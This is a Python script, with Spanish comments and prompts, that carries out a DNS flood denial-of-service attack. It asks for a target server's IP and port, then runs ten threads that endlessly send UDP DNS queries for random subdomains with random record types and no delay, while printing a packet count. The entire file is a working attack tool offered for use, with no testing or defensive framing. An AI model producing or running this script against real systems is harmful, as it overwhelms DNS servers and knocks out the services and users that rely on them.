import socket
import random
import threading
import time

# Configuración por defecto
NUM_THREADS = 10
DELAY = 0  # segundos

DOMAINS = [
    "example.com", "test.com", "abc.com", "xyz.net", "site.org",
    "foo.bar", "demo.site", "mydns.local", "domain.tld"
]
QTYPE_LIST = [
    (b'\x00\x01', "A"), (b'\x00\x1c', "AAAA"), (b'\x00\x0f', "MX"), (b'\x00\x10', "TXT"),
    (b'\x00\x02', "NS"), (b'\x00\x05', "CNAME")
]

def random_domain():
    sub = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(4,10)))
    domain = random.choice(DOMAINS)
    return f"{sub}.{domain}"

def build_dns_query(domain):
    transaction_id = random.randint(0, 65535).to_bytes(2, "big")
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    qname = b''.join(bytes([len(x)]) + x.encode() for x in domain.split('.')) + b'\x00'
    qtype, _ = random.choice(QTYPE_LIST)
    qclass = b'\x00\x01'
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

def attack(target_ip, target_port, stats, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    try:
        while True:
            domain = random_domain()
            dns_query = build_dns_query(domain)
            sock.sendto(dns_query, (target_ip, target_port))
            sent += 1
            if DELAY > 0:
                time.sleep(DELAY)
    except Exception as e:
        print(f"[Thread {thread_id}] Error: {e}")
    finally:
        stats[thread_id] = sent
        sock.close()

def main():
    target_ip = input("Ingresa la IP del servidor DNS objetivo: ").strip()
    target_port = int(input("Ingresa el puerto de destino: ").strip())
    stats = [0] * NUM_THREADS

    threads = []
    print(f"Iniciando ataque DNS flood a {target_ip}:{target_port} con {NUM_THREADS} hilos...")
    for i in range(NUM_THREADS):
        t = threading.Thread(target=attack, args=(target_ip, target_port, stats, i), daemon=True)
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while True:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            total_sent = sum(stats)
            print(f"[{elapsed}s] Paquetes enviados: {total_sent}", end='\r', flush=True)
    except KeyboardInterrupt:
        print("\nAtaque detenido por el usuario.")
    finally:
        print(f"\nTotal paquetes enviados: {sum(stats)}")

if __name__ == "__main__":
    main()
